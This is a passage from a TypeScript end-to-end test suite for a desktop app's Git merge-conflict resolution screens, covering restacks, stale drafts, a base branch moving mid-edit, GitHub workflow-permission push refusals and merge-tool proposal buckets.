      const s=window.conflictFixture;s.restack.status='blocked';s.restack.blocked={url:s.dependents[0],title:'Apply bounded retry delays',reason:'The restack is paused on a new conflict. Choose what to keep in each file, mark it reviewed, then continue. No dependent branches have been pushed.',paths:['src/retry.ts'],reused:0,files:[{...s.files[0],result:s.files[0].original,resolved:false}]};
      window.dispatchEvent(new CustomEvent('gnosis-resolve-conflicts',{detail:s.url}));
    })()`);
    await wait("document.querySelector('.restack-conflict-file .conflict-block[data-state=open]')");
    assert.equal(await js("!!document.querySelector('.restack-conflict-file textarea')"), false);
    assert.deepEqual(
      await js(
        "[...document.querySelector('.restack-conflict-file .conflict-block').querySelectorAll('.conflict-side-label')].map(e=>e.textContent)"
      ),
      ['Updated parent · feature/retry', 'This PR · feature/retry-121']
    );
    assert.ok(await js(`(${visibleButton('Continue restack')}).disabled`));
    assert.match(
      await js<string>("document.querySelector('.restack-review .step-card-status').textContent"),
      /Mark each file reviewed/
    );
    await captureAll('restack-paused');
    for (let n = 0; n < 2; n++) {
      await js(
        "document.querySelector('.restack-conflict-file .conflict-block[data-state=open] [data-choice=theirs]').click()"
      );
      await new Promise((r) => setTimeout(r, 150));
    }
    await wait("!document.querySelector('.restack-conflict-file .conflict-block[data-state=open]')");
    // Closing must save an unreviewed paused draft; it must not lose it or publish.
    await click('Close');
    await wait("!document.querySelector('.conflict-workspace')");
    assert.doesNotMatch(await js<string>('window.conflictFixture.restack.blocked.files[0].result'), /<{7}/);
    assert.equal(await js('window.conflictFixture.restack.blocked.files[0].resolved'), false);
    await open();
    await click('Mark reviewed');
    await click('Continue restack');
    await wait("!document.querySelector('.restack-blocked')");
    await click('Close');

    // A draft whose PR branch moved cannot be published; Load latest changes keeps what still applies.
    await js(
      "window.conflictFixture.status='editing';window.conflictFixture.stale=true;window.conflictFixture.staleReason='head-moved';window.conflictFixture.files[0].resolved=false;window.dispatchEvent(new CustomEvent('gnosis-resolve-conflicts',{detail:window.conflictFixture.url}));"
    );
    await wait(
      "document.querySelector('.conflict-footer')?.textContent.includes('Someone pushed to feature/retry after you started.')"
    );
    assert.equal(
      await js("!!document.querySelector('[data-conflict-primary]')"),
      false,
      'Only loading the latest changes continues'
    );
    assert.match(
      await js<string>("document.querySelector('.conflict-footer').textContent"),
      /Load latest changes reuses the ones that still apply/,
      'The copy names the button it offers'
    );
    assert.ok(await exists('Load latest changes'));
    assert.equal(await exists('Start over with latest code…'), false);
    await captureAll('stale');
    await resize(760, 800);
    await capture('narrow');
    assert.ok(await footerFits(), 'Footer buttons fit at 760 × 800');
    assert.ok(await js('document.documentElement.scrollWidth<=innerWidth'));
    await js('window.conflictFixture.stale=false;window.conflictFixture.staleReason=undefined');
    await click('Load latest changes');
    await wait("window.conflictCalls.at(-1).kind==='open' && window.conflictCalls.at(-1).keep===true");
    await click('Start over with latest code…');
    await wait("document.querySelector('.conflict-footer')?.textContent.includes('Cancel')");
    await capture('start-over-narrow');
    await click('Cancel');
    await resize(1280, 900);
    await click('Close');

    // Edge screens drop the resolve controls and draft status, and name the state.
    const noResolveChrome = async () => {
      for (const selector of [
        '.conflict-files',
        '.conflict-footer',
        '.conflict-save-state',
        '[data-conflict-keys]',
        '.conflict-suggest-trigger',
      ])
        assert.equal(await js(`!!document.querySelector(${JSON.stringify(selector)})`), false, `${selector} is hidden`);
      assert.doesNotMatch(
        await js<string>("document.querySelector('.conflict-workspace').innerText"),
        /Mergiraf|agents were not used|Local draft/
      );
    };
    await js(
      "window.conflictFixture.files=[];window.conflictFixture.stale=false;window.conflictFixture.preparation='clean-merge';window.dispatchEvent(new CustomEvent('gnosis-resolve-conflicts',{detail:window.conflictFixture.url}))"
    );
    await wait("document.querySelector('.conflict-state h2')?.textContent==='No conflicts to resolve'");
    await noResolveChrome();
    await captureAll('clean-merge');
    await click('Review and push…');
    await wait("document.querySelector('.conflict-confirm .step-card')");
    assert.match(
      await js<string>("document.querySelector('.conflict-confirm').innerText"),
      /Changes coming from main · 2 files/
    );
    await captureAll('clean-merge-confirm');
    await click('Close');
    await js(
      "window.conflictFixture.preparation='up-to-date';window.dispatchEvent(new CustomEvent('gnosis-resolve-conflicts',{detail:window.conflictFixture.url}))"
    );
    await wait("document.querySelector('.conflict-state h2')?.textContent==='feature/retry already includes main'");
    await noResolveChrome();
    assert.equal(await js("!!document.querySelector('.step-list,.conflict-confirm')"), false);
    await wait("document.activeElement?.textContent.trim()==='Done'");
    await captureAll('up-to-date');
    await click('Done');
    await js(
      "window.conflictFixture.preparation='clean-merge';window.conflictFixture.stale=true;window.dispatchEvent(new CustomEvent('gnosis-resolve-conflicts',{detail:window.conflictFixture.url}))"
    );
    await wait("document.querySelector('.conflict-state h2')?.textContent==='The PR changed'");
    await noResolveChrome();
    await captureAll('empty-stale');
    await click('Load latest changes');
    await wait('window.conflictCalls.at(-1).restart===true && window.conflictCalls.at(-1).keep===true');
    await click('Close');

    // Preparation shows inline progress; Activity is mentioned only when it takes a while.
    await js('window.slowOpen=7000');
    await open();
    await wait("document.querySelector('.conflict-state .loading-indicator')");
    assert.equal(
      await js("document.querySelector('.conflict-state').textContent.includes('Activity')"),
      false,
      'Activity is mentioned only after about 5 s'
    );
    await capture('preparing');
    await wait("document.querySelector('.conflict-state')?.textContent.includes('continues in Activity')");
    await capture('preparing-slow');
    await wait("!document.querySelector('.conflict-state .loading-indicator')");
    await click('Close');
    // A failed preparation explains itself; the raw output is under Details.
    await js(
      "window.slowOpen=0;window.failOpen='Git could not complete this operation. fatal: unable to read tree cccccccc'"
    );
    await open();
    await wait("document.querySelector('.conflict-state[data-state=failed] .conflict-error')");
    assert.equal(
      await js("document.querySelector('.conflict-error-title').textContent"),
      'Gnosis couldn’t prepare this merge.'
    );
    assert.ok(await exists('Try again'));
    await capture('failure');
    await captureAll('prepare-failed');
    await js('window.failOpen=undefined');
    await click('Try again');
    await wait("document.querySelector('.conflict-state h2')");
    await click('Close');

    // Long script lines with commit IDs as Git labels: the view still shows branch names only.
    const command = Array.from({ length: 180 }, (_, i) => `node scripts/check-${i}.mjs`).join(' && ');
    const files = ['package.json', 'scripts/test-workbench.mjs'].map((name) => {
      const wrap = (text: string) =>
        name.endsWith('.json')
          ? `{\n  "scripts": {\n    "test": "${text}"\n  }\n}\n`
          : `export const command = ${JSON.stringify(text)};\n`;
      const base = wrap(command),
        ours = wrap(command + ' --pr'),
        theirs = wrap(command + ' --main');
      const original = `<<<<<<< ${'a'.repeat(40)}\n${ours}||||||| ${'b'.repeat(40)}\n${base}=======\n${theirs}>>>>>>> ${'c'.repeat(40)}\n`;
      return {
        path: name,
        mode: '100644',
        base,
        ours,
        theirs,
        original,
        result: original,
        resolved: false,
        source: 'manual',
      };
    });
    // The preview matches this session's files: both resolved files plus one clean change from main.
    const longPatch = files
      .map(
        (f) =>
          `diff --git a/${f.path} b/${f.path}\n--- a/${f.path}\n+++ b/${f.path}\n@@ -1 +1 @@\n-${f.ours.split('\n')[0]}\n+${f.theirs.split('\n')[0]} \n`
      )
      .join('');
    await js(
      `window.conflictPreview=${JSON.stringify(
        parsePatchFiles(longPatch + patch.slice(patch.indexOf('diff --git a/src/clock.ts'))).flatMap((p) => p.files)
      )}`
    );
    await js(
      `window.conflictFixture.files=${JSON.stringify(files)};window.conflictFixture.stale=false;window.conflictFixture.preparation='conflicts';window.dispatchEvent(new CustomEvent('gnosis-resolve-conflicts',{detail:window.conflictFixture.url}))`
    );
    await wait("document.querySelectorAll('.conflict-files button').length===2");
    await wait("document.activeElement?.closest('.conflict-block')");
    assert.equal(await js("document.querySelector('.conflict-file-title strong').textContent"), 'package.json');
    await key('n');
    await wait("document.querySelector('.conflict-file-title strong')?.textContent==='scripts/test-workbench.mjs'");
    await wait("document.activeElement?.closest('.conflict-block')");
    assert.doesNotMatch(
      await js<string>("document.querySelector('.conflict-file-pane').innerText"),
      /[0-9a-f]{40}/,
      'Commit IDs never label versions'
    );
    await wait("document.querySelector('.conflict-view diffs-container')?.shadowRoot?.querySelector('[data-line]')");
    await captureAll('long-script-conflict');
    await resize(760, 800);
    assert.ok(await footerFits(), 'Long lines never push the footer out of view');
    await resize(1280, 900);
    await key('p');
    await wait("document.querySelector('.conflict-file-title strong')?.textContent==='package.json'");
    await key('n');
    await wait("document.querySelector('.conflict-file-title strong')?.textContent==='scripts/test-workbench.mjs'");
    // Reviewing one file advances without publishing; each file keeps its own saved content.
    await wait("document.activeElement?.closest('.conflict-block')");
    await key('1');
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='review-result'");
    await key('m');
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");
    assert.match(
      await js<string>("document.querySelector('[data-conflict-primary]').textContent"),
      /Mark reviewed & next file/
    );
    await key('m');
    await wait("document.querySelector('.conflict-file-title strong').textContent==='package.json'");
    assert.equal(await js('window.conflictFixture.files[1].resolved'), true);
    assert.equal(await js('window.conflictFixture.files[0].resolved'), false);
    await wait("document.activeElement?.closest('.conflict-block')");
    await key('2');
    await key('m');
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");
    await captureAll('files-reviewed');
    await key('m');
    await wait("document.querySelector('.conflict-confirm .step-card')");
    assert.equal(await js('window.conflictFixture.files.every(f=>f.resolved)'), true);
    assert.equal(await publishes(), 2, 'File review never publishes');
    assert.match(
      await js<string>("document.querySelector('.conflict-confirm').innerText"),
      /Your resolutions · 2 files/
    );
    assert.match(
      await js<string>("document.querySelector('.conflict-confirm').innerText"),
      /Changes coming from main · 1 file/
    );
    // File shortcuts pause in the confirmation, and Enter never pushes.
    await key('m');
    await key('Enter');
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(await publishes(), 2, 'Neither shortcuts nor Enter push');
    // Escape cancels the workspace without pushing; the draft stays saved locally.
    await key('Escape');
    await wait("!document.querySelector('.conflict-workspace')");
    assert.equal(await publishes(), 2);

    // main moves while the user resolves: Gnosis merges it again with the saved resolutions.
    await js(`(()=>{
      // A single PR: no dependents to restack after the push.
      window.conflictFixture.dependents=[];delete window.conflictFixture.restack;
      const original=window.electronAPI.conflictResolution;
      window.electronAPI.conflictResolution=async req=>{
        const s=window.conflictFixture;const move=window.baseMove;
        if(!move||(req.kind!=='publish'&&req.kind!=='preview')||req.kind!==move.on)return original(req);
        window.conflictCalls.push(req);window.baseMove=undefined;
        if(move.kind==='head')throw Error("Error invoking remote method 'conflict-resolution': Error: The PR branch has new commits since you started. Nothing was pushed.");
        const from=s.baseSha;s.baseSha='f'.repeat(40);
        if(move.kind==='conflict'){
          // The new main commit conflicts once more in package.json; its earlier resolution stays.
          const f=s.files[0];const added='<<<<<<< '+'a'.repeat(40)+'\\n  "version": "1.1.0",\\n=======\\n  "version": "2.0.0",\\n>>>>>>> '+'f'.repeat(40)+'\\n';
          f.original=added+f.original;f.result=added+f.result;f.resolved=false;
          s.version++;return {session:structuredClone(s),baseMoved:{from,to:s.baseSha,conflicts:1,files:[f.path]}};
        }
        s.status='published';s.commitSha='d'.repeat(40);s.version++;
        return {session:structuredClone(s),baseMoved:{from,to:s.baseSha,conflicts:0,files:[]}};
      };
    })()`);
    const reviewAndPush = async () => {
      await open();
      await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='confirm'");
      await click('Review and push…');
      await wait("document.querySelector('.conflict-confirm .step-card')");
    };

    // 1. A new conflict from main: only that conflict reopens, nothing is pushed, the other file stays reviewed.
    await js("window.baseMove={on:'publish',kind:'conflict'}");
    await reviewAndPush();
    await click('Push merge commit');
    await wait("!document.querySelector('.conflict-confirm') && document.querySelector('.conflict-files')");
    assert.equal(await publishes(), 3);
    assert.equal(await js("document.querySelector('.conflict-file-title strong').textContent"), 'package.json');
    await wait("document.querySelectorAll('.conflict-block[data-state=open]').length===1");
    assert.equal(
      await js<string>("document.querySelector('.conflict-footer-status').textContent"),
      'main moved and brought a new conflict in package.json. Nothing was pushed. Your other resolutions are kept.'
    );
    assert.equal(await stage(), 'conflicted');
    assert.deepEqual(
      await js("[...document.querySelectorAll('.conflict-files [data-stage]')].map(e=>e.dataset.stage)"),
      ['conflicted', 'reviewed'],
      'Only the file with the new conflict needs work'
    );
    assert.doesNotMatch(await js<string>("document.querySelector('.conflict-view').innerText"), /<{7}|>{7}/);
    await captureAll('base-moved-new-conflict');
    await js("document.querySelector('.conflict-block[data-state=open] [data-choice=theirs]').click()");
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='review-result'");
    await click('Review result');
    await click('Mark reviewed');
    await wait("document.querySelector('.conflict-confirm .step-card')");
    assert.match(await js<string>('window.conflictFixture.files[0].result'), /"version": "2.0.0"/);
    await click('Close');

    // 2. main moved again with no new conflict: the push goes ahead and says so in one line.
    await js("window.baseMove={on:'publish',kind:'clean'}");
    await reviewAndPush();
    await click('Push merge commit');
    await wait("document.querySelector('.conflict-outcome h2')?.textContent==='feature/retry updated'");
    assert.equal(await publishes(), 4);
    assert.equal(
      await js<string>("document.querySelector('.conflict-outcome [data-base-moved]').textContent"),
      'main moved while you worked, so the merge commit includes its latest changes. Your resolutions still applied.'
    );
    await captureAll('base-moved-pushed');
    await click('Done');

    // 3. Someone pushed to the PR: blocked, and the recovery is the button the copy names.
    await js(
      "Object.assign(window.conflictFixture,{status:'editing',commitSha:undefined});window.conflictFixture.files.forEach(f=>f.resolved=true);window.baseMove={on:'preview',kind:'head'}"
    );
    await open();
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='confirm'");
    await click('Review and push…');
    await wait("document.querySelector('.conflict-footer-status[data-error]')");
    assert.equal(
      await js<string>("document.querySelector('.conflict-footer-status[data-error]').textContent"),
      'Someone pushed to feature/retry after you started. Nothing was pushed. Your resolutions are saved. Select Load latest changes to merge the new commits; resolutions that still apply are reused.'
    );
    assert.equal(await exists('Review and push…'), false, 'Publishing stays blocked');
    assert.ok(await footerFits());
    await captureAll('head-moved');
    await click('Load latest changes');
    await wait(
      "window.conflictCalls.at(-1).kind==='open' && window.conflictCalls.at(-1).restart===true && window.conflictCalls.at(-1).keep===true"
    );
    assert.equal(await publishes(), 4, 'A blocked publish never pushes');
    await click('Close');

    // 4. The resolution changes a GitHub Actions workflow and the sign-in has repo and read:org, not workflow. GitHub
    // would refuse the push, so the confirmation says why, keeps Push disabled and signs in again with one click.
    const workflowPatch =
      'diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n@@ -1 +1 @@\n-  node-version: 20\n+  node-version: 22\n';
    const refusal = `Error invoking remote method 'conflict-resolution': Error: Git could not complete this operation. To https://github.com/klang/engine.git\n ! [remote rejected] ${'d'.repeat(40)} -> feature/retry (refusing to allow an OAuth App to create or update workflow \`.github/workflows/ci.yml\` without \`workflow\` scope)\nerror: failed to push some refs`;
    await js(`(()=>{
      Object.assign(window.conflictFixture,{status:'editing',commitSha:undefined,stale:false});
      window.conflictFixture.files.forEach(f=>f.resolved=true);
      window.conflictPreview=[...window.conflictPreview,...${JSON.stringify(parsePatchFiles(workflowPatch).flatMap((p) => p.files))}];
      const inner=window.electronAPI.conflictResolution;
      window.electronAPI.conflictResolution=async req=>{
        if(req.kind==='publish'&&window.refuseWorkflow){window.conflictCalls.push(req);throw Error(${JSON.stringify(refusal)});}
        return inner(req);
      };
      window.signInStarts=0;
      const begin=window.electronAPI.beginGitHubSignIn;
      window.electronAPI.beginGitHubSignIn=(...args)=>{window.signInStarts++;return begin(...args)};
      const complete=window.electronAPI.completeGitHubSignIn;
      window.electronAPI.completeGitHubSignIn=async(...args)=>{await new Promise(r=>window.authorizeSignIn=r);return complete(...args)};
      window.setFixtureGitHubScopes(['repo','read:org']);
    })()`);
    await reviewAndPush();
    const warning = "document.querySelector('.conflict-confirm [data-workflow-push-warning] .github-scope-prompt')";
    await wait(`!!${warning}`);
    assert.equal(
      await js(`${warning}.querySelector('p').textContent`),
      'This resolution changes GitHub Actions workflows (.github/workflows/…). GitHub only accepts pushes that change workflows from sign-ins with the workflow permission.'
    );
    assert.ok(await js(`(${visibleButton('Push merge commit')}).disabled`), 'Push waits for the workflow permission');
    await captureAll('workflow-permission');
    await js(`[...${warning}.querySelectorAll('button')].find(b=>b.textContent.trim()==='Sign in again').click()`);
    await wait("document.querySelector('.github-auth-dialog [aria-label=\"GitHub sign-in code\"]')?.textContent==='TEST-CODE'");
    assert.equal(await js('window.signInStarts'), 1, 'One click starts sign-in');
    assert.ok(await js("!!document.querySelector('.conflict-workspace')"), 'The workspace stays open behind sign-in');
    await capture('workflow-permission-sign-in');
    await js('window.authorizeSignIn();window.authorizeSignIn=undefined');
    // GitHub authorizes the new scopes, including workflow: Push is available again, nothing was pushed meanwhile.
    await wait("!document.querySelector('.github-auth-dialog')");
    await wait(`!${warning}`);
    await wait(`!(${visibleButton('Push merge commit')}).disabled`);
    assert.equal(await publishes(), 4);

    // GitHub refuses the push anyway, as it does for a token that reports no scopes: the same plain message and
    // Sign in again, not Git's words. The resolutions stay; nothing is reopened.
    await js("window.refuseWorkflow=true;window.setFixtureGitHubScopes(null,'fine-grained')");
    await click('Push merge commit');
    await wait("document.querySelector('.conflict-confirm .conflict-error')");
    assert.equal(await publishes(), 5);
    assert.equal(await js("document.querySelector('.conflict-error-title').textContent"), 'Needs the workflow permission.');
    const refusedText = await js<string>(
      "[...document.querySelectorAll('.conflict-error > div > p')].map(p=>p.textContent).join(' ')"
    );
    assert.match(
      refusedText,
      /This resolution changes GitHub Actions workflows \(\.github\/workflows\/…\)\. GitHub only accepts pushes that change workflows from sign-ins with the workflow permission\. Nothing was pushed\. Your resolutions are saved\./
    );
    assert.doesNotMatch(refusedText, /refusing to allow|remote rejected|Git could not/);
    assert.match(await js<string>("document.querySelector('.conflict-error-details pre').textContent"), /refusing to allow an OAuth App/);
    assert.ok(await js(`(${visibleButton('Push merge commit')}).disabled`), 'A refused push is never replayed on its own');
    assert.ok(await exists('Sign in again'));
    assert.equal(await js('window.conflictFixture.files.every(f=>f.resolved)'), true, 'Resolutions are kept');
    assert.equal(await js("window.conflictCalls.at(-1).kind"), 'publish', 'Nothing reopened or discarded the draft');
    await captureAll('workflow-push-refused');
    await click('Sign in again');
    await wait("typeof window.authorizeSignIn==='function' && document.querySelector('.github-auth-dialog [aria-label=\"GitHub sign-in code\"]')");
    await js('window.authorizeSignIn();window.authorizeSignIn=undefined');
    await wait("!document.querySelector('.github-auth-dialog')");
    await wait(`!(${visibleButton('Push merge commit')}).disabled`);
    assert.equal(await js("!!document.querySelector('.conflict-confirm .conflict-error')"), false);
    await js('window.refuseWorkflow=false');
    await click('Push merge commit');
    await wait("document.querySelector('.conflict-outcome h2')?.textContent==='feature/retry updated'");
    assert.equal(await publishes(), 6);
    await click('Done');

    // Buckets: preparation's proposals are checked with tree-sitter. Merged is collapsed, Check shows why, Decide is
    // what is left. A proposal that loses main's new function stays in Check.
    const three = 'export function three() {\n  return 3;\n}\n\n';
    const four = 'export function four() {\n  return 4;\n}\n\n';
    const two = 'export function two() {\n  return 2;\n}\n';
    const retry = {
      path: 'src/retry.ts',
      base: `export function one() {\n  return 1;\n}\n\n${two}`,
      ours: `export function one() {\n  return 10;\n}\n\n${three}${two}`,
      theirs: `export function one() {\n  return 11;\n}\n\n${four}${two}`,
      original: `export function one() {\n<<<<<<< feature/retry\n  return 10;\n||||||| ancestor\n  return 1;\n=======\n  return 11;\n>>>>>>> main\n}\n\n<<<<<<< feature/retry\n${three}||||||| ancestor\n=======\n${four}>>>>>>> main\n${two}`,
      proposals: [null, { source: 'mergiraf', text: three }],
      source: 'mergiraf',
    };
    // Each side adds an import at its own place, after and before a: both sides inserting at one place would be Check
    // since #476.
    const imports = {
      path: 'src/imports.ts',
      base: `import { a } from './a';\n\n${two}`,
      ours: `import { a } from './a';\nimport { b } from './b';\n\n${two}`,
      theirs: `import { c } from './c';\nimport { a } from './a';\n\n${two}`,
      original: `<<<<<<< feature/retry\nimport { a } from './a';\nimport { b } from './b';\n||||||| ancestor\nimport { a } from './a';\n=======\nimport { c } from './c';\nimport { a } from './a';\n>>>>>>> main\n\n${two}`,
      proposals: [{ source: 'mergiraf', text: "import { c } from './c';\nimport { a } from './a';\nimport { b } from './b';\n" }],
      source: 'mergiraf',
    };
    const notes = {
      path: 'docs/notes.md',
      base: 'a\n',
      ours: 'b\n',
      theirs: 'c\n',
      original: '<<<<<<< feature/retry\nb\n||||||| ancestor\na\n=======\nc\n>>>>>>> main\n',
      proposals: [{ source: 'rerere', text: 'b\nc\n' }],
      source: 'rerere',
    };
    const withResult = (f: { original: string; proposals: ({ text: string } | null)[] }) => ({
      ...f,
      mode: '100644',
      resolved: false,
      result: ((index) => f.original.replace(/<<<<<<<[\s\S]*?>>>>>>> main\n/g, (raw) => f.proposals[index++]?.text ?? raw))(0),
    });
    await js(`(()=>{
      Object.assign(window.conflictFixture,{status:'editing',commitSha:undefined,stale:false,version:1,restack:undefined,dependents:[],files:${JSON.stringify([retry, imports, notes].map(withResult))}});
      window.conflictCalls=[];
    })()`);
    await open();
    await wait(
      "document.querySelector('[data-conflict-summary]')?.textContent==='3 files have conflicts. 2 of 4 conflicts are merged and checked. 2 need you: 1 to check, 1 to decide.'"
    );
    const showMerged = "[...document.querySelectorAll('.conflict-summary label')].find(l=>l.textContent.includes('Show me every merged conflict'))?.querySelector('input')";
    assert.equal(await js(`${showMerged}.checked`), true, 'Merged conflicts still show for review by default');
    assert.deepEqual(
      await js("[...document.querySelectorAll('.conflict-files button small')].map(s=>s.textContent)"),
      ['1 to decide1 to check', '1 merged', '1 merged']
    );
    await checksDone();
    assert.equal(await js(`${block(0)}.dataset.state`), 'open');
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-block-header').textContent`), /Decide/);
    assert.equal(await js(`${block(1)}.dataset.bucket`), 'check');
    assert.match(
      await js<string>(`${block(1)}.querySelector('.conflict-block-header').textContent`),
      /^Conflict 2 of 2Checkexport function four\(\) \{ from main is missing from the result\./
    );
    // J and K visit both conflicts that need you: the one to decide and the one to check.
    await js(`${block(0)}.focus()`);
    await key('j');
    assert.equal(await activeBlock(), '1');
    await captureAll('buckets-check');
    await js("[...document.querySelectorAll('.conflict-files button')].find(b=>b.querySelector('span').textContent==='src/imports.ts').click()");
    await wait(`${block(0)}?.dataset.bucket==='merged'`);
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-kept').textContent`), /Merged · Combined both sides’ changes/);
    // The Conflicts view's diff shows the result (#445 item 8): a Merged card is its two lines, with no code of its own.
    assert.equal(await js(`!!${block(0)}.querySelector('details, .conflict-snippet')`), false, 'Merged stays one line');
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-block-note-line').textContent`), /The file parses\. Every line of both sides is accounted for\./);
    assert.equal(await stage(), 'resolved', 'With the switch on, a Merged file still waits for your review');
    await captureAll('buckets-merged');
    // Off: files whose every conflict is Merged are marked reviewed for you. Nothing is pushed.
    await js(`${showMerged}.click()`);
    await wait(
      "['src/imports.ts','docs/notes.md'].every(p=>window.conflictCalls.some(r=>r.kind==='save'&&r.resolved&&r.path===p))"
    );
    assert.equal(await js("window.conflictCalls.some(r=>r.kind==='save'&&r.resolved&&r.path==='src/retry.ts')"), false);
    assert.equal(await publishes(), 0);
    await wait("document.querySelector('.conflict-file-title [data-stage]')?.dataset.stage==='reviewed'");
    await captureAll('buckets-skip-review');
    await js(`${showMerged}.click()`);
    await wait(`${showMerged}.checked`);
    // On is the default, so turning it back on removes the setting instead of saving true.
    await wait(
      "window.electronAPI.loadPreferences().then(p=>!p.repositorySettings?.['klang/engine'] || !('showMergedConflicts' in p.repositorySettings['klang/engine']))"
    );
    // Undo moves a Merged conflict to Decide with both sides.
    await js(`[...${block(0)}.querySelectorAll('button')].find(b=>b.textContent.trim()==='Undo').click()`);
    await wait(`${block(0)}?.dataset.state==='open'`);
    await wait(
      "document.querySelector('[data-conflict-summary]')?.textContent==='3 files have conflicts. 1 of 4 conflicts are merged and checked. 3 need you: 1 to check, 2 to decide.'"
    );
    // Review probe: the proposal is one click away from Decide, and Reset file returns to the proposals.
    await click('Use the proposal');
    await wait(`${block(0)}?.dataset.bucket==='merged'`);
    await js(`[...${block(0)}.querySelectorAll('button')].find(b=>b.textContent.trim()==='Undo').click()`);
    await wait(`${block(0)}?.dataset.state==='open'`);
    await click('Reset file');
    await wait(`${block(0)}?.dataset.bucket==='merged'`);
    assert.equal(await exists('Reset file'), false, 'The proposals are the reset point');
    assert.ok(await exists('Start from Git’s conflict'));
    await click('Start from Git’s conflict');
    await wait(`${block(0)}?.dataset.state==='open'`);
    await click('Close');

    // oddur/gnosis-conflict-lab #99: the PR only reformats a call and main changes one argument. Mergiraf's result is
    // checked by its syntax tree and Merged. The trap beside it: the PR also changed a token while it reformatted, so
    // its proposal stays in Check, and the header shows the same "1 to check" as the file list, not "Resolved".
    const csharp = (call: string) =>
      `public static class Lab\n{\n    public static int alpha(int value)\n    {\n        var total = value + 1;\n${call}    }\n}\n`;
    const oneLine = (last: string) => `        return combine(value, total, value * 2, ${last});\n`;
    const split = (last: string, total = 'total') =>
      `        return combine(\n            value,\n            ${total},\n            value * 2,\n            ${last}\n        );\n`;
    const reformat = (path: string, ours: string, proposal: string) => {
      const [head, tail] = csharp('@').split('@');
      return {
        path,
        mode: '100644',
        base: csharp(oneLine('4')),
        ours: csharp(ours),
        theirs: csharp(oneLine('5')),
        original: `${head}<<<<<<< feature/retry\n${ours}||||||| ancestor\n${oneLine('4')}=======\n${oneLine('5')}>>>>>>> main\n${tail}`,
        proposals: [{ source: 'mergiraf', text: proposal }],
        result: csharp(proposal),
        resolved: false,
        source: 'mergiraf',
      };
    };
    const reformatted = reformat('lab/reformat.cs', split('4'), split('5'));
    const trap = reformat('lab/trap.cs', split('4', 'total + 1'), split('5', 'total + 1'));
    await js(`(()=>{
      Object.assign(window.conflictFixture,{version:1,files:${JSON.stringify([trap, reformatted])}});
      window.conflictCalls=[];
    })()`);
    await open();
    await wait(
      "document.querySelector('[data-conflict-summary]')?.textContent==='2 files have conflicts. 1 of 2 conflicts are merged and checked. 1 to check.'"
    );
    const badges = (scope: string) =>
      js<string[][]>(
        `[...document.querySelectorAll('${scope} [data-status]')].map(b=>[b.dataset.status,...[...b.querySelectorAll('svg')].map(s=>s.getAttribute('class')),b.textContent])`
      );
    const listBadge = (index: number) => badges(`.conflict-files button:nth-child(${index + 1})`);
    assert.deepEqual(await badges('.conflict-file-title'), await listBadge(0), 'The header and the file list agree');
    assert.deepEqual(
      (await badges('.conflict-file-title')).map(([status, , text]) => [status, text]),
      [['buckets', '1 to check']]
    );
    assert.match((await badges('.conflict-file-title'))[0][1], /circle-question-mark|circle-help/, 'The Check icon');
    assert.equal(await js("!!document.querySelector('.conflict-file-title [data-status=resolved]')"), false);
    await checksDone();
    assert.equal(await js(`${block(0)}.dataset.bucket`), 'check');
    assert.match(
      await js<string>(`${block(0)}.querySelector('.conflict-block-header').textContent`),
      /Both sides changed the same lines\. Check that the result keeps both changes\./
    );
    assert.match(
      await js<string>("document.querySelector('.conflict-footer-status').textContent"),
      /^1 to check in this file · 0 of 2 files reviewed$/
    );
    await captureAll('reformat-trap-check');
    await js("[...document.querySelectorAll('.conflict-files button')].find(b=>b.querySelector('span').textContent==='lab/reformat.cs').click()");
    await wait(`${block(0)}?.dataset.bucket==='merged'`);
    assert.deepEqual(await badges('.conflict-file-title'), await listBadge(1), 'The header and the file list agree');
    assert.equal((await badges('.conflict-file-title'))[0][2], '1 merged');
    assert.match(
      await js<string>(`${block(0)}.querySelector('.conflict-block-note-line').textContent`),
      /^The PR only reformatted these lines and main changed them; the result keeps main’s change in the PR’s formatting\./
    );
    await captureAll('reformat-merged');
    await click('Close');

    // A reorder: Mergiraf's result also moves lines outside Git's conflict, so it is one whole-file proposal in Check.
    // Its checks pass, and it still is not Merged. Using it is the Suggest step; the file is then reviewed as usual.
    const fn = (name: string, total = 'value + 1') =>
      `func ${name}(value int) int {\n\ttotal := ${total}\n\tscaled := total * 2\n\treturn scaled - 3\n}\n`;
    const goFile = (functions: string[]) => ['package lab\n', ...functions].join('\n');
    const reorder = {
      path: 'lab/reorder.go',
      mode: '100644',
      base: goFile([fn('alpha'), fn('beta')]),
      ours: goFile([fn('beta'), fn('alpha')]),
      theirs: goFile([fn('alpha', 'value + 10'), fn('beta')]),
      original: `package lab\n\n<<<<<<< feature/retry\n${fn('beta')}\n${fn('alpha')}||||||| ancestor\n${fn('alpha')}\n${fn('beta')}=======\n${fn('alpha', 'value + 10')}\n${fn('beta')}>>>>>>> main\n`,
      wholeFile: { source: 'mergiraf', text: goFile([fn('beta'), fn('alpha', 'value + 10')]) },
      resolved: false,
      source: 'manual',
    };
    const late = {
      path: 'src/limits.ts',
      mode: '100644',
      base: 'export const limit = 1;\n',
      ours: 'export const limit = 2;\n',
      theirs: 'export const limit = 3;\n',
      original:
        '<<<<<<< feature/retry\nexport const limit = 2;\n||||||| ancestor\nexport const limit = 1;\n=======\nexport const limit = 3;\n>>>>>>> main\n',
      structuralNote: 'Structural merge timed out.',
      resolved: false,
      source: 'manual',
    };
    await js(`(()=>{
      Object.assign(window.conflictFixture,{version:1,files:${JSON.stringify([reorder, late].map((f) => ({ ...f, result: f.original })))}});
      window.conflictCalls=[];
    })()`);
    await open();
    await wait(
      "document.querySelector('[data-conflict-summary]')?.textContent==='2 files have conflicts. 2 need you: 1 proposal to check, 1 to decide.'"
    );
    assert.deepEqual(
      await js("[...document.querySelectorAll('.conflict-file-title [data-stage]')].map(b=>[b.dataset.stage,b.textContent])"),
      [['proposal', 'Proposal ready']]
    );
    assert.deepEqual(
